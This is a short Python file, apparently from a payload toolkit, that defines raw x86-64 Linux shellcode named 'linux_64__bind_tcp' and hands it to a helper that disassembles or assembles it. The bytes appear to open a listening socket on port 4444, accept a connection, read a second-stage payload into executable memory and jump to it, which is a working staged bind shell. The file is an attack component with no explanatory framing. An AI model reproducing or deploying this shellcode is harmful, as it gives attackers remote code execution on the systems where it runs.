from src._payloads import _payloads

# Calling static methods without instantiating the class

linux_64__bind_tcp =  b""
linux_64__bind_tcp += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
linux_64__bind_tcp += b"\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89"
linux_64__bind_tcp += b"\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x59\x6a\x32"
linux_64__bind_tcp += b"\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f\x05\x50\x56"
linux_64__bind_tcp += b"\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
linux_64__bind_tcp += b"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48"
linux_64__bind_tcp += b"\x97\x5f\x0f\x05\xff\xe6"

_name = "linux_64__bind_tcp"

_payloads._asm_from_bytes(linux_64__bind_tcp, _name, _name)
